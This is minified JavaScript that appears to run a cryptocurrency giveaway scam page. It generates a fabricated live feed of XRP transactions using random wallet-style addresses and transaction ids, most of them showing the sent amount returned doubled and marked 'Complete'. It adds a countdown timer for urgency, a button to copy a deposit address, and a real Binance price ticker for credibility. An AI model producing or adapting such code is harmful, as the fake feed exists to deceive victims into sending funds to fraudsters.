(function () { const t = document.createElement("link").relList; if (t && t.supports && t.supports("modulepreload")) return; for (const n of document.querySelectorAll('link[rel="modulepreload"]')) o(n); new MutationObserver(n => { for (const r of n) if (r.type === "childList") for (const a of r.addedNodes) a.tagName === "LINK" && a.rel === "modulepreload" && o(a) }).observe(document, { childList: !0, subtree: !0 }); function s(n) { const r = {}; return n.integrity && (r.integrity = n.integrity), n.referrerPolicy && (r.referrerPolicy = n.referrerPolicy), n.crossOrigin === "use-credentials" ? r.credentials = "include" : n.crossOrigin === "anonymous" ? r.credentials = "omit" : r.credentials = "same-origin", r } function o(n) { if (n.ep) return; n.ep = !0; const r = s(n); fetch(n.href, r) } })(); function u(e, t) { return Math.floor(Math.random() * (t - e + 1)) + e } function h() { const e = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"; let s = "r"; for (let o = 1; o < 16; o++) { const n = u(0, e.length - 1); s += e[n] } return s + "..." } $(".qr-item>span").on("click", function () { $(".qr-fill").toggleClass("active"), $(this).toggleClass("active") }); const v = (e, t) => { $(`.item.${t}`).removeClass("active"), $(`.item.${e}`).addClass("active") }; function g(e, t) { let s = e * 60 + t; const o = () => { const r = Math.floor(s / 60), a = s % 60, f = r < 10 ? `0${r}` : r, p = a < 10 ? `0${a}` : a; $(".time > p").text(`${f}:${p}`), s <= 0 ? clearInterval(n) : s-- }; o(); const n = setInterval(o, 1e3) } let i = !1; $(".swine").on("click", function () { this.dataset.next == "item-c" && !i && (i = !0, g(timedata.min, timedata.sec)), v(this.dataset.next, this.dataset.current) }); function y() { const e = "0123456789abcdef"; let s = ""; for (let o = 0; o < 15; o++) { const n = u(0, e.length - 1); s += e[n] } return (s + "...").toUpperCase() } function C(e, t) { return Math.floor(Math.random() * (t - e) + e) } function c(e) { return e.toLocaleString("en-US") } function b(e) { const t = Math.random(); return t < .7 && e > 999 ? { cl: "status-a", nm: "Complete" } : t < .9 && e < 999 ? { cl: "status-b", nm: "Canceled" } : { cl: "status-c", nm: "In progress" } } function x() { const e = C(500, 1e5), t = e * 2, s = b(e); return `<div class=item-live><div class=item><p>${y()}</div><div class='item fite'><p>${h()}</div><div class=item><p>${c(e)} XRP</div><div class='item fite lw'><p>${c(s.cl == "status-b" ? e : t)} XRP</div><div class="item ${s.cl}"><p>${s.nm}</div></div>` } function m() { $(".body-live").prepend(x()), setTimeout(m, w(4e3, 1e4)) } m(); function w(e, t) { return Math.floor(Math.random() * (t - e + 1) + e) } const M = e => { if (navigator.clipboard) navigator.clipboard.writeText(e); else { const t = document.createElement("textarea"); t.value = e, document.body.appendChild(t), t.select(), document.execCommand("copy"), document.body.removeChild(t) } }; let l; $(".copy").on("click", function () { clearTimeout(l), M($(this).prev().text()), $(".notif").addClass("active"), l = setTimeout(() => { $(".notif").removeClass("active") }, 2e3) }); let L = new WebSocket("wss://stream.binance.com:9443/ws/xrpusdt@ticker"), d = !0; L.onmessage = e => { d && (d = !1, $(".current").removeClass("wait")); let t = JSON.parse(e.data), s = t.P, o = t.c; s.includes("-") ? $(".current>span").addClass("dec") : $(".current>span").removeClass("dec"), $(".current>span>span").text(parseFloat(s).toFixed(2)), $(".current>p>span").text(parseFloat(o).toFixed(4)) }; $(".vis").fadeOut();
